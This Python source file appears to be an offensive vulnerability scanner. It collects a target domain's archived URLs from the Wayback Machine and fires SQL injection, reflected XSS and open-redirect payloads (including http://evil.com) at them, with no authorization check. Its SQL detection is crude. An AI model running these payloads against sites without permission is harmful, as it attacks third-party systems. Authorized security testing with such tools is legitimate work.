import requests
import re
import aiohttp
import asyncio
from concurrent.futures import ThreadPoolExecutor
from aiohttp import ClientSession, ClientTimeout
from tqdm import tqdm
from colorama import Fore, Style, init
import logging
import aiofiles


print("░██╗░░░░░░░██╗░█████╗░██╗░░░██╗██████╗░░█████╗░░█████╗░██╗░░██╗░░░░░░██╗░░██╗██╗░░░██╗███╗░░██╗████████╗███████╗██████╗░")
print("░██║░░██╗░░██║██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗██╔══██╗██║░██╔╝░░░░░░██║░░██║██║░░░██║████╗░██║╚══██╔══╝██╔════╝██╔══██╗")
print("░╚██╗████╗██╔╝███████║░╚████╔╝░██████╦╝███████║██║░░╚═╝█████═╝░█████╗███████║██║░░░██║██╔██╗██║░░░██║░░░█████╗░░██████╔╝")
print("░░████╔═████║░██╔══██║░░╚██╔╝░░██╔══██╗██╔══██║██║░░██╗██╔═██╗░╚════╝██╔══██║██║░░░██║██║╚████║░░░██║░░░██╔══╝░░██╔══██╗")
print("░░╚██╔╝░╚██╔╝░██║░░██║░░░██║░░░██████╦╝██║░░██║╚█████╔╝██║░╚██╗░░░░░░██║░░██║╚██████╔╝██║░╚███║░░░██║░░░███████╗██║░░██║")
print("░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝░░░░░░╚═╝░░╚═╝░╚═════╝░╚═╝░░╚══╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝")
print("\n")
print("WAYBACK-HUNTER: A tool to crawl URLs from Wayback Machine and hunt vulnerabilities like XSS, SQLi, and open redirects.")
print("\n")


init(autoreset=True)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

async def fetch_wayback_urls(domain, max_urls, retries=3, delay=5):
    logging.info(Fore.CYAN + "[+] Fetching URLs from Wayback Machine...")
    wayback_api = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original&collapse=urlkey"
    
    async with ClientSession(timeout=ClientTimeout(total=10)) as session:
        for attempt in range(retries):
            try:
                async with session.get(wayback_api) as response:
                    if response.status == 200:
                        data = await response.json()
                        all_urls = [item[0] for item in data[1:]]
                        regex = re.compile(r".*[\?&].*=.*|.*\.(php|asp|aspx|jsp)$|[\?&](redirect|url|r)=http", re.IGNORECASE)
                        valid_urls = {url for url in all_urls if regex.search(url)}
                        final_urls = {url for url in valid_urls if not re.search(r"%[0-9A-Fa-f]{2}", url) and "FUZZ" not in url}
                        return list(final_urls)[:max_urls]
            except asyncio.TimeoutError:
                logging.error(Fore.RED + f"Timeout error fetching URLs (Attempt {attempt + 1}). Retrying...")
            except Exception as e:
                logging.error(Fore.RED + f"Error fetching URLs: {e}")
            if attempt < retries - 1:
                logging.info(Fore.YELLOW + f"Retrying in {delay} seconds...")
                await asyncio.sleep(delay)
    
    logging.error(Fore.RED + "Failed to fetch Wayback URLs after multiple attempts.")
    return []

def check_sql_injection(url):
    if re.search(r"redir\.php\?r=", url, re.IGNORECASE):
        return False
    try:
        test_payload = "' OR '1'='1"
        response = requests.get(url + test_payload, timeout=3)
        return "error" in response.text.lower() or "sql" in response.text.lower()
    except requests.RequestException:
        return False

def check_xss(url):
    payloads = [
        "<script>alert('XSS BY WAYBACK-HUNTER')</script>",
        "<img src='x' onerror='alert(1)'>",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<a href='javascript:alert(1)'>Click me</a>"
    ]
    for payload in payloads:
        try:
            response = requests.get(url + payload, timeout=3)
            if payload in response.text:
                return True, payload
        except requests.RequestException:
            continue
    return False, ""

def check_open_redirect(url):
    try:
        redirect_payload = "http://evil.com"
        redirect_url = re.sub(r"(redirect|url|r)=.*", rf"\1={redirect_payload}", url, flags=re.IGNORECASE)
        response = requests.get(redirect_url, timeout=3, allow_redirects=True)
        if redirect_payload in response.url:
            return True, redirect_url
    except requests.RequestException:
        return False, ""
    return False, ""

def scan_url(url):
    sql_vulnerable = check_sql_injection(url)
    xss_vulnerable, xss_payload = check_xss(url)
    redirect_vulnerable, redirect_url = check_open_redirect(url)
    return url, sql_vulnerable, xss_vulnerable, redirect_vulnerable, xss_payload, redirect_url

def scan_urls(urls):
    sql_vulnerable_urls = []
    xss_vulnerable_urls = []
    redirect_vulnerable_urls = []
    xss_payloads = []
    redirect_urls = []
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        results = list(tqdm(executor.map(scan_url, urls), total=len(urls), desc="Scanning URLs", ncols=100))
        
        for result in results:
            url, sql_vulnerable, xss_vulnerable, redirect_vulnerable, xss_payload, redirect_url = result
            if sql_vulnerable:
                sql_vulnerable_urls.append(url)
            if xss_vulnerable:
                xss_vulnerable_urls.append(url)
                xss_payloads.append(xss_payload)
            if redirect_vulnerable:
                redirect_vulnerable_urls.append(url)
                redirect_urls.append(redirect_url)
    
    return sql_vulnerable_urls, xss_vulnerable_urls, redirect_vulnerable_urls, xss_payloads, redirect_urls

async def generate_html_report(sql_vulnerable_urls, xss_vulnerable_urls, redirect_vulnerable_urls, xss_payloads, redirect_urls):
    html_content = """
    <html>
    <head>
        <title>Vulnerability Scan Results</title>
        <style>
            body { font-family: Arial, sans-serif; color: #333; margin: 0; padding: 20px; background-color: #f4f4f9; }
            h1, h2 { color: #4CAF50; }
            ul { list-style-type: none; padding: 0; }
            li { padding: 10px; margin: 5px 0; border-radius: 5px; }
            .sql { background-color: #f2dede; }
            .xss { background-color: #fcf8e3; }
            .redirect { background-color: #dff0d8; }
            a { color: #007BFF; text-decoration: none; }
            a:hover { text-decoration: underline; }
            .container { max-width: 800px; margin: auto; }
            .footer { margin-top: 20px; text-align: center; font-size: 12px; color: #777; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Vulnerability Scan Report</h1>
            <h2>SQL Injection Vulnerable URLs</h2>
            <ul>
    """
    for url in sql_vulnerable_urls:
        html_content += f'<li class="sql"><a href="{url}" target="_blank">{url}</a></li>'
    
    html_content += """
            </ul>
            <h2>XSS Vulnerable URLs</h2>
            <ul>
    """
    for i, url in enumerate(xss_vulnerable_urls):
        html_content += f'<li class="xss"><a href="{url}{xss_payloads[i]}" target="_blank">{url} (XSS Payload)</a></li>'
    
    html_content += """
            </ul>
            <h2>Open Redirect Vulnerable URLs</h2>
            <ul>
    """
    for i, url in enumerate(redirect_vulnerable_urls):
        html_content += f'<li class="redirect"><a href="{redirect_urls[i]}" target="_blank">{url} (Redirect)</a></li>'
    
    html_content += """
            </ul>
            <div class="footer">
                <p>Generated by the Vulnerability Scanner | <a href="https://github.com/your-repo" target="_blank">GitHub Repository</a></p>
            </div>
        </div>
    </body>
    </html>
    """

    async with aiofiles.open("vulnerability_report.html", "w") as file:
        await file.write(html_content)

async def main():
    domain = input(Fore.YELLOW + "Enter target domain (e.g., example.com or http(s)://example.com): ")
    
    domain = re.sub(r"^https?://", "", domain)
    
    max_urls = int(input(Fore.YELLOW + "Enter the maximum number of URLs to scan: "))
    urls = await fetch_wayback_urls(domain, max_urls)

    
    if not urls:
        print(Fore.RED + "No valid URLs found for testing.")
        return
    
    sql_vulnerable_urls, xss_vulnerable_urls, redirect_vulnerable_urls, xss_payloads, redirect_urls = scan_urls(urls)
    
    print(Fore.RED + "SQL Injection Vulnerable URLs:", sql_vulnerable_urls)
    print(Fore.MAGENTA + "XSS Vulnerable URLs:", xss_vulnerable_urls)
    print(Fore.BLUE + "Open Redirect Vulnerable URLs:", redirect_vulnerable_urls)

    if sql_vulnerable_urls or xss_vulnerable_urls or redirect_vulnerable_urls:
        await generate_html_report(sql_vulnerable_urls, xss_vulnerable_urls, redirect_vulnerable_urls, xss_payloads, redirect_urls)
        print(Fore.GREEN + "HTML report generated: vulnerability_report.html")

if __name__ == "__main__":
    asyncio.run(main())
